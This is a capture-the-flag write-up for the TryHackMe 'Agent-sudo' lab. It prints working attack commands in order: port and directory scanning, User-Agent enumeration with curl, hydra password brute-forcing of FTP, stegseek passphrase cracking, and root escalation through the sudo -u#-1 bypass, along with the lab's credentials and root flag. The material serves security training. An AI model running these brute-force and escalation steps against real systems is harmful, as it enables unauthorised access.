<h1>Agent-sudo</h1>

<h2>Recognize</h2>

1. analyze ip to find open ports with **nmap** it's:
```
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

2. analyze url to find open directoryes with **feroxbuster**. I found:
 * /
 * /index.php

<h2>Search vulnerable</h2>
3. After just fast view **http://ip/** and **/index.php** we see:
```
Dear agents,
        <br><br>
        Use your own <b>codename</b> as user-agent to access the site.
        <br><br>
        From,<br>
        Agent R
```

May it means that each agent has codename of alphabet (like Agent R). Try use **curl** with flag **-A**
```
curl -A R http://ip                       
What are you doing! Are you one of the 25 employees? If not, I going to report this incident
```

Yeah. Thats right

4. Use AI to make optimize searching script for find right agent:
```
for l in {A..Z}; do echo -n "Agent $l: "; curl -s -L -A "$l" http://10.113.143.116 | head -n 1; done
```

As a result it's **agent C** with fullname **chris**

5. Try again with curl to see result:
```
curl -A C -L http://ip
```

As a result:
```
Attention chris, <br><br>

Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak! <br><br>

From,<br>
Agent R 
```

<h2>FTP</h2>

6. Don't forget about our ftp and ssh services. We know login name **chris** and the password is weak. Lets try use **rockyou.txt**
```
hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://ip
```

As a result: 
```
[21][ftp] host: 10.113.143.116   login: chris   password: crystal
```

7. Good we know each information, lets go check **ftp** services:
```
ftp chris@ip
```

and run following command: 
 * bin - switch to binary mode
 * prompt off - turn off accept for each file
 * mget * # - download all

8. Now we see on our machine directory: [cute-alien.jpg  cutie.png  To_agentJ.txt] files. On **.txt** we see that ""Dear agent J,

All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.

From,
Agent C""

9. With **exiftool** we know that cutie.png **[minor] Trailer data after PNG IEND chunk**. Lets try brute it for stego. 
```
stegseek cute-alien.jpg /usr/share/wordlists/rockyou.txt
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "Area51"           
[i] Original filename: "message.txt".
[i] Extracting to "cute-alien.jpg.out".
```

10. Nice lets view **cute-alien.jpg.out**
```
cat cute-alien.jpg.out
```

As a result we know: 
 * login: james
 * hackerrules!

lets go to **SSH**

<h2>SSH</h2>

11. lets connect to **ssh** and view allowed files:
```
ssh james@ip

james@agent-sudo:~$ ls
Alien_autospy.jpg  user_flag.txt
```

Well done we see first flag **user_flag.txt**

12. switch to root. Firstly we should know what we can do as root
```
james@agent-sudo:~$ sudo -l
[sudo] password for james: 
Matching Defaults entries for james on agent-sudo:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash
```

Nice, we can run anything with: **/bin/bash**

13. Finally root flag.
```
james@agent-sudo:~$ sudo -u#-1 /bin/bash
root@agent-sudo:~# whoami
root
```

```
root@agent-sudo:/# cd root
root@agent-sudo:/root# ls
root.txt
root@agent-sudo:/root# cat root.txt 
To Mr.hacker,

Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine. 

Your flag is 
b53a02f55b57d4439e3341834d70c062

By,
DesKel a.k.a Agent R
```
